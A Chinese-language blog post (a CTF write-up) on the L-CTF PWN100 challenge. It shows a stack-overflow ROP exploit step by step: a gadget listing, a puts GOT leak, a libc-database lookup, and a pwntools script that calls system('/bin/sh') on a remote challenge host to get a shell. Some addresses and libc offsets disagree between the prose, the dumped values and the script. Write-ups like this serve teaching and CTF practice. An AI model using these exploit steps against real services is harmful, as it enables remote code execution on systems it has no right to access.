@@ -1,0 +1,179 @@
+---
+layout: post
+title:  "L-CTF PWN100"
+date:   2016-10-09 11:49:45 +0200
+categories: ctf,pwn
+published: true
+---
+漏洞是一个栈溢出
+其中的sub_40063D内部有个read()，读入了0xC80个字节的数据，V1是bp-40h明显栈溢出
+然后就可以考虑构造rop，lib泄露，调用system
+
+关于lib泄露：
+在程序的FUNTION中找到一个系统函数，这道题就用了puts，记下它在.got.plt中的地址为之后的rop构造做准备。
+此题的目标是替换bp后的return地址为指令pop_rdi_ret，在二进制文件中查找该指令，可以运用ROPgadget-master库
+具体代码是：
+     在ROPgadget-master目录下，运行Python ROPgadget.py --binary filename
+运行结果为：
+
+{% highlight ruby %}
+root@DESKTOP-I943ECH:/mnt/e/pwntools/ROPgadget-master# python ROPgadget.py  --binary ../pwn100
+Gadgets information
+============================================================
+0x00000000004005a4 : adc byte ptr [rax], ah ; jmp rax
+0x00000000004005e4 : adc byte ptr [rax], ah ; jmp rdx
+0x000000000040076f : add bl, dh ; ret
+0x000000000040076d : add byte ptr [rax], al ; add bl, dh ; ret
+0x000000000040076b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
+0x00000000004006fa : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
+0x000000000040076c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
+0x00000000004006fb : add byte ptr [rax], al ; add cl, cl ; ret
+0x00000000004004db : add byte ptr [rax], al ; add rsp, 8 ; ret
+0x00000000004006fc : add byte ptr [rax], al ; leave ; ret
+0x000000000040076e : add byte ptr [rax], al ; ret
+0x0000000000400608 : add byte ptr [rcx], al ; ret
+0x00000000004006fd : add cl, cl ; ret
+0x0000000000400604 : add eax, 0x200a56 ; add ebx, esi ; ret
+0x00000000004005cb : add eax, edx ; sar rax, 1 ; jne 0x4005dc ; pop rbp ; ret
+0x0000000000400609 : add ebx, esi ; ret
+0x00000000004004de : add esp, 8 ; ret
+0x00000000004005ca : add rax, rdx ; sar rax, 1 ; jne 0x4005dd ; pop rbp ; ret
+0x00000000004004dd : add rsp, 8 ; ret
+0x0000000000400607 : and byte ptr [rax], al ; add ebx, esi ; ret
+0x000000000040062d : call rax
+0x00000000004007b3 : call rsp
+0x00000000004005cf : clc ; jne 0x4005d8 ; pop rbp ; ret
+0x0000000000400686 : cld ; cmp eax, dword ptr [rbp - 0x1c] ; jl 0x400668 ; leave ; ret
+0x0000000000400685 : cld ; cmp eax, dword ptr [rbp - 0x1c] ; jl 0x400669 ; leave ; ret
+0x000000000040058d : cmp eax, 0xe ; mov rbp, rsp ; ja 0x4005a0 ; pop rbp ; ret
+0x0000000000400687 : cmp eax, dword ptr [rbp - 0x1c] ; jl 0x400667 ; leave ; ret
+0x00000000004006b5 : dec ecx ; ret
+0x000000000040074c : fmul qword ptr [rax - 0x7d] ; ret
+0x00000000004005a0 : hlt ; pop rbp ; mov edi, 0x601050 ; jmp rax
+0x0000000000400593 : ja 0x40059a ; pop rbp ; ret
+0x000000000040059f : je 0x40059d ; pop rbp ; mov edi, 0x601050 ; jmp rax
+0x000000000040068a : jl 0x400664 ; leave ; ret
+0x00000000004005a7 : jmp rax
+0x00000000004005e7 : jmp rdx
+0x00000000004005d0 : jne 0x4005d7 ; pop rbp ; ret
+0x000000000040068c : leave ; ret
+0x0000000000400603 : mov byte ptr [rip + 0x200a56], 1 ; ret
+0x00000000004006f9 : mov eax, 0 ; leave ; ret
+0x0000000000400684 : mov eax, dword ptr [rbp - 4] ; cmp eax, dword ptr [rbp - 0x1c] ; jl 0x40066a ; leave ; ret
+0x000000000040062b : mov ebp, esp ; call rax
+0x0000000000400591 : mov ebp, esp ; ja 0x40059c ; pop rbp ; ret
+0x0000000000400625 : mov edi, 0x600e20 ; mov rbp, rsp ; call rax
+0x00000000004005a2 : mov edi, 0x601050 ; jmp rax
+0x00000000004005e2 : mov edi, 0x601050 ; jmp rdx
+0x00000000004005e0 : mov esi, eax ; mov edi, 0x601050 ; jmp rdx
+0x000000000040062a : mov rbp, rsp ; call rax
+0x0000000000400590 : mov rbp, rsp ; ja 0x40059d ; pop rbp ; ret
+0x00000000004005df : mov rsi, rax ; mov edi, 0x601050 ; jmp rdx
+0x0000000000400768 : nop dword ptr [rax + rax] ; ret
+0x0000000000400606 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; ret
+0x000000000040075c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040075e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400760 : pop r14 ; pop r15 ; ret
+0x0000000000400762 : pop r15 ; ret
+0x0000000000400602 : pop rbp ; mov byte ptr [rip + 0x200a56], 1 ; ret
+0x00000000004005a1 : pop rbp ; mov edi, 0x601050 ; jmp rax
+0x00000000004005de : pop rbp ; mov rsi, rax ; mov edi, 0x601050 ; jmp rdx
+0x000000000040075b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040075f : pop rbp ; pop r14 ; pop r15 ; ret
+0x0000000000400595 : pop rbp ; ret
+0x0000000000400763 : pop rdi ; ret
+0x0000000000400761 : pop rsi ; pop r15 ; ret
+0x000000000040075d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004005a3 : push rax ; adc byte ptr [rax], ah ; jmp rax
+0x00000000004005e3 : push rax ; adc byte ptr [rax], ah ; jmp rdx
+0x0000000000400624 : push rbp ; mov edi, 0x600e20 ; mov rbp, rsp ; call rax
+0x0000000000400605 : push rsi ; or ah, byte ptr [rax] ; add byte ptr [rcx], al ; ret
+0x00000000004004e1 : ret
+0x00000000004005c5 : ret 0xc148
+0x00000000004005cc : ror byte ptr [rax - 0x2f], 1 ; clc ; jne 0x4005db ; pop rbp ; ret
+0x000000000040059e : sal byte ptr [rsp + rsi*8 + 0x5d], 0xbf ; push rax ; adc byte ptr [rax], ah ; jmp rax
+0x00000000004005ce : sar eax, 1 ; jne 0x4005d9 ; pop rbp ; ret
+0x00000000004005cd : sar rax, 1 ; jne 0x4005da ; pop rbp ; ret
+0x0000000000400775 : sub esp, 8 ; add rsp, 8 ; ret
+0x0000000000400774 : sub rsp, 8 ; add rsp, 8 ; ret
+0x000000000040076a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
+
+Unique gadgets found: 77
+
+{% endhighlight %}
+
+找到其中pop redi;ret的地址为0x0000000000400762
+pop redi;ret;的目的是将栈中下一个内容存放在rdi中，然后调用输出函数，把栈中下一个内容输出。
+故下一步为将栈中下一个内容替换为puts函数的系统地址的存放地址，刚刚查找过的0x0000000000601018。
+将再下一个地址替换为puts地址，即输出puts在目标系统中的地址。（这个地址是动态的，只有最后3位是不变的）
+综上，可以写出以下的python脚本：
+
+{% highlight ruby %}
+from pwn import *
+
+pwn = remote('119.28.63.211',2332)
+
+pop_rdi_ret = 0x0000000000400763
+loop = p64(0x00040068e)
+
+#---------------leak
+
+payload = ''
+payload += 'B'*72   #  puts.plt
+payload += p64(pop_rdi_ret)
+payload += p64(0x000601018)
+payload += p64(0x0000400500)
+payload += loop
+
+pwn.send(payload +'A'*(200-len(payload)))
+pwn.recvuntil('bye~\n')
+
+re = pwn.recv(6)
+
+#-------------------cal
+
+puts_got = u64(re+'\x00'*2)
+print puts_got
+print 'puts_got = ',hex(puts_got)
+{% endhighlight %}
+完成了lib泄露的步骤。
+然后就是找shell code了。利用找到的后三位，使用库libc-database，可以找到该系统shell的地址。
+具体代码如下：
+{% highlight ruby %}
+root@DESKTOP-I943ECH:/mnt/e/pwntools/libc-database# ./find puts 7c0
+archive-eglibc (id libc6-i386_2.15-0ubuntu10.15_amd64)
+{% endhighlight %}
+找到了库名，然后：
+{% highlight ruby%}
+root@DESKTOP-I943ECH:/mnt/e/pwntools/libc-database# ./dump libc6-i386_2.15-0ubuntu10.15_amd64
+offset___libc_start_main_ret = 0x19513
+offset_system = 0x0003eed0
+offset_dup2 = 0x000df4f0
+offset_read = 0x000debe0
+offset_write = 0x000dec60
+offset_str_bin_sh = 0x15d7ec
+{% endhighlight %}
+找到了系统的函数地址。然后就好说了，再栈溢出一次就OK，所以接下来的代码是：
+{% highlight ruby%}
+sys_addr = puts_got - 0x000070c70 + 0x00000468f0
+binsh_addr = puts_got - 0x0000070c70 + 0x0017dbc5
+
+print 'sys_addr = ',hex(sys_addr)
+print 'binsh_addr = ',hex(binsh_addr)
+
+#---------------------
+
+payload = ''
+payload += 'A'*72
+payload += p64(pop_rdi_ret)
+payload += p64(binsh_addr)
+payload += p64(sys_addr)
+payload += p64(0x12345678)
+
+pwn.send(payload+'A'*(200-len(payload)))
+
+pwn.recvuntil('bye~\n')
+
+pwn.interactive()
+{% endhighlight %}
+要注意的是函数的地址得加上偏移量。（由于写笔记时服务器已经关闭，所以函数地址有所出入）
